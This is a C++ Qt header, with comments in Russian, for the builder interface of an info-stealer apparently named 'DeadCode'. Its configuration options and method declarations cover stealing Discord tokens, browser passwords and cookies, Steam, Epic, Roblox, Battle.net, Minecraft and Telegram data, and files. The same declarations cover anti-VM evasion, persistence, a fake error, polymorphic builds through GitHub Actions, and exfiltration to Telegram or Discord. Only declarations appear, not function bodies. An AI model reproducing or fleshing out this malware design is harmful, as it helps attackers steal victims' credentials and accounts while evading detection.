#ifndef MAINWINDOW_H
#define MAINWINDOW_H

#include <QMainWindow>
#include <QNetworkAccessManager>
#include <QTimer>
#include <QPropertyAnimation>
#include <QNetworkReply>
#include <QByteArray>
#include <QInputDialog>
#include <array>
#include <random>
#include <sstream>
#include <iomanip>
#include <filesystem>
#include <vector>
#include <string>
#include <fstream>
#include <thread>

QT_BEGIN_NAMESPACE
namespace Ui { class MainWindow; }
QT_END_NAMESPACE

class MainWindow : public QMainWindow
{
    Q_OBJECT

public:
    MainWindow(QWidget *parent = nullptr);  // Конструктор главного окна
    ~MainWindow();                         // Деструктор для очистки ресурсов

    std::string generateUniqueXorKey();    // Генерация уникального XOR-ключа
    std::array<unsigned char, 16> GetEncryptionKey(bool useFirstKey); // Получение ключа шифрования
    bool isRunningInVM();                  // Проверка на виртуальную машину

    // Структура для хранения настроек
    struct Config {
        bool discord = false;              // Включение кражи токенов Discord
        bool steam = false;                // Включение кражи данных Steam
        bool steamMAFile = false;          // Включение кражи MA-файлов Steam
        bool epic = false;                 // Включение кражи данных Epic Games
        bool roblox = false;               // Включение кражи данных Roblox
        bool battlenet = false;            // Включение кражи данных Battle.net
        bool minecraft = false;            // Включение кражи данных Minecraft
        bool cookies = false;              // Включение кражи куки браузеров
        bool passwords = false;            // Включение кражи паролей браузеров
        bool screenshot = false;           // Включение создания скриншота
        bool fileGrabber = false;          // Включение граббера файлов
        bool systemInfo = false;           // Включение сбора системной информации
        bool socialEngineering = false;    // Включение сбора данных для социальной инженерии
        bool chatHistory = false;          // Включение сбора истории чатов
        bool telegram = false;             // Включение кражи данных Telegram
        bool antiVM = false;               // Включение защиты от виртуальных машин
        bool fakeError = false;            // Включение фейковой ошибки
        bool silent = false;               // Включение тихого режима
        bool autoStart = false;            // Включение автозапуска
        bool persist = false;              // Включение персистентности
        std::string sendMethod = "local file"; // Метод отправки данных (Telegram, Discord, Local File)
        std::string token = "";            // Токен для Telegram или Discord
        std::string chatId = "";           // Chat ID для Telegram
        std::string filename = "DeadCode.exe"; // Имя выходного файла
        std::string encryptionKey1 = "";   // Первый ключ шифрования
        std::string encryptionKey2 = "";   // Второй ключ шифрования
        std::string encryptionSalt = "";   // Соль для шифрования
    } config;

signals:
    void logUpdated(const QString& message); // Сигнал для обновления логов
    void startStealSignal();                // Сигнал для запуска процесса кражи данных

private slots:
    // Слоты для генерации кода и файлов
    void generatePolymorphicCode();         // Генерация полиморфного кода
    void generateBuildKeyHeader();          // Генерация файла ключей шифрования
    void copyIconToBuild();                 // Копирование иконки в директорию сборки
    void buildExecutable();                 // Сборка исполняемого файла

    // Слоты для интеграции с GitHub Actions
    void triggerGitHubActions();            // Запуск сборки через GitHub Actions
    void checkBuildStatus();                // Проверка статуса сборки через GitHub Actions

    // Слоты для процесса кражи и отправки данных
    void startStealProcess();               // Запуск процесса кражи данных после успешной сборки
    void StealAndSendData();                // Основная функция кражи и отправки данных
    void takeScreenshot(const std::string& dir); // Создание скриншота
    void collectSystemInfo(const std::string& dir); // Сбор системной информации
    void stealBrowserData(const std::string& dir); // Кража данных браузера (пароли, куки)
    void stealDiscordData(const std::string& dir); // Кража данных Discord (токены, история чатов)
    void stealTelegramData(const std::string& dir); // Кража данных Telegram (история чатов)
    void stealSteamData(const std::string& dir);   // Кража данных Steam (конфиги, MA-файлы)
    void stealEpicData(const std::string& dir);    // Кража данных Epic Games
    void stealRobloxData(const std::string& dir);  // Кража данных Roblox
    void stealBattleNetData(const std::string& dir); // Кража данных Battle.net
    void stealMinecraftData(const std::string& dir); // Кража данных Minecraft
    void stealFiles(const std::string& dir);       // Кража файлов (граббер)
    void collectSocialEngineeringData(const std::string& dir); // Сбор данных для социальной инженерии
    void archiveData(const std::string& dir, const std::string& archivePath); // Архивация данных
    void encryptData(const std::string& inputPath, const std::string& outputPath); // Шифрование данных
    void sendData(const std::string& filePath);    // Отправка данных
    void sendToTelegram(const std::string& filePath); // Отправка данных в Telegram
    void sendToDiscord(const std::string& filePath);  // Отправка данных в Discord

    // Слоты для управления конфигурацией и логами
    void saveConfig(const QString& fileName = QString()); // Сохранение конфигурации
    void loadConfig();                     // Загрузка конфигурации
    void exportLogs();                     // Экспорт логов в файл
    void exitApp();                        // Выход из приложения
    void showAbout();                      // Отображение информации о программе
    void appendLog(const QString& message);  // Добавление сообщения в лог

    // Слоты для дополнительных функций
    bool AntiAnalysis();                    // Проверка на запуск в виртуальной машине
    void Stealth();                        // Включение скрытного режима
    void Persist();                        // Обеспечение персистентности
    void FakeError();                      // Показ фейковой ошибки

    // Слоты для обработки действий пользователя
    void on_iconBrowseButton_clicked();    // Обработчик выбора иконки
    void on_buildButton_clicked();         // Обработчик кнопки "Собрать"
    void on_actionSaveConfig_triggered();  // Обработчик сохранения конфигурации из меню
    void on_actionLoadConfig_triggered();  // Обработчик загрузки конфигурации из меню
    void on_actionExportLogs_triggered();  // Обработчик экспорта логов из меню
    void on_actionExit_triggered();        // Обработчик выхода из меню
    void on_actionAbout_triggered();       // Обработчик "О программе" из меню
    void replyFinished(QNetworkReply *reply); // Обработчик завершения сетевого запроса

private:
    // Приватные методы
    void animateSection(QLabel* sectionLabel, QSpacerItem* spacer); // Анимация появления секций
    QByteArray applyXOR(const QByteArray& data, const std::array<unsigned char, 16>& key); // Применение XOR-шифрования
    QByteArray applyAES(const QByteArray& data, const std::array<unsigned char, 16>& key, const std::array<unsigned char, 16>& iv); // Применение AES-шифрования

    // Приватные члены
    Ui::MainWindow *ui;                    // Указатель на UI, сгенерированный Qt Designer
    QNetworkAccessManager *manager;        // Менеджер для сетевых запросов (GitHub API, Telegram, Discord)
    bool isBuilding;                       // Флаг состояния сборки
    QTimer *buildTimer;                    // Таймер для обновления состояния
    QTimer *statusCheckTimer;              // Таймер для проверки статуса сборки через GitHub Actions
    QString workflowRunId;                 // ID запущенного workflow для проверки статуса
};

#endif // MAINWINDOW_H